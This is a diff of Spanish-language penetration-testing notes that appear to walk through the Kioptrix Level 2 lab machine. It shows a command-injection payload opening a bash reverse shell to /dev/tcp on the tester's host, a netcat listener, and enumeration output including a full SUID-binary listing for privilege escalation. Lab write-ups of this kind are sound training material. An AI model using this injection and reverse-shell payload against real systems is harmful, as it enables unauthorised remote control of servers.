@@ -59,3 +59,42 @@ En el formulario usamos command injection
     ; bash -c "bash -i >& /dev/tcp/192.168.111.128/2222 0>&1"
   Y en nuestra máquina la recibimos con
     nc -nlvp 2222
+
+uname -a
+  Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux
+
+find / -perm -4000 -ls 2> /dev/null
+  146394   48 -r-sr-xr-x   1 root     root        46076 May  2  2007 /sbin/unix_chkpwd
+  146426   20 -r-s--x--x   1 root     root        20016 May  2  2007 /sbin/pam_timestamp_check
+  146442  300 -r-sr-xr-x   1 root     root       301242 May  2  2007 /sbin/pwdb_chkpwd
+   74011   12 -rwsr-xr-x   1 root     root         6096 May  2  2007 /usr/sbin/ccreds_validate
+   71248   36 -rws--x--x   1 root     root        30760 May  2  2007 /usr/sbin/userhelper
+   74112   12 -rwsr-xr-x   1 root     root         6668 Feb 21  2005 /usr/sbin/userisdnctl
+   74837   16 -r-s--x---   1 root     apache      10760 May  4  2007 /usr/sbin/suexec
+   71187   20 -rwsr-xr-x   1 root     root        15228 May  3  2007 /usr/sbin/usernetctl
+  164553  436 -rws--x--x   1 root     root       434644 May  2  2007 /usr/libexec/openssh/ssh-keysign
+   73326    8 -rwsr-xr-x   1 root     root         7396 May  2  2007 /usr/libexec/pt_chown
+  162584  132 -rwsr-xr-x   1 root     root       123961 May  3  2007 /usr/kerberos/bin/ksu
+  197680   16 -rwsr-x---   1 root     squid        9952 May  4  2007 /usr/lib/squid/pam_auth
+  197678   16 -rwsr-x---   1 root     squid       10208 May  4  2007 /usr/lib/squid/ncsa_auth
+   78498   20 -rws--x--x   1 root     root        18392 May  3  2007 /usr/bin/chsh
+   73150   24 -rwsr-xr-x   1 root     root        17304 May 10  2006 /usr/bin/rcp
+   74016  100 ---s--x--x   1 root     root        93816 Aug 21  2005 /usr/bin/sudo
+   73257  120 -rwsr-xr-x   1 root     root       117802 May  2  2007 /usr/bin/chage
+   66708   88 -rwsr-xr-x   1 root     root        82772 Jul 12  2006 /usr/bin/crontab
+   73152   20 -rwsr-xr-x   1 root     root        12312 May 10  2006 /usr/bin/rlogin
+   73153   16 -rwsr-xr-x   1 root     root         8692 May 10  2006 /usr/bin/rsh
+   74673  136 -rwsr-xr-x   1 root     root       131181 May  2  2007 /usr/bin/gpasswd
+   73992   48 -rwsr-xr-x   1 root     root        42280 Apr 26  2006 /usr/bin/at
+   73322    8 -rws--x--x   1 root     root         7700 May  3  2007 /usr/bin/newgrp
+   71269   20 -rws--x--x   1 root     root        17708 May  3  2007 /usr/bin/chfn
+   74440   24 -rwsr-xr-x   1 root     root        19597 May  3  2007 /usr/bin/lppasswd
+   73259   76 -rwsr-xr-x   1 root     root        72261 May  2  2007 /usr/bin/sg
+   74541   24 -r-s--x--x   1 root     root        21200 Aug 21  2005 /usr/bin/passwd
+   81365   92 -rwsr-xr-x   1 root     root        87016 May  3  2007 /bin/mount
+   81289   20 -rwsr-xr-x   1 root     root        12300 May  2  2007 /bin/traceroute6
+  276376   28 -rwsr-xr-x   1 root     root        23844 Nov 23  2006 /bin/traceroute
+   81371   60 -rwsr-xr-x   1 root     root        53612 May  3  2007 /bin/umount
+   81286   36 -rwsr-xr-x   1 root     root        30924 May  2  2007 /bin/ping6
+   81285   40 -rwsr-xr-x   1 root     root        33272 May  2  2007 /bin/ping
+   81339   68 -rwsr-xr-x   1 root     root        61168 May  5  2007 /bin/su
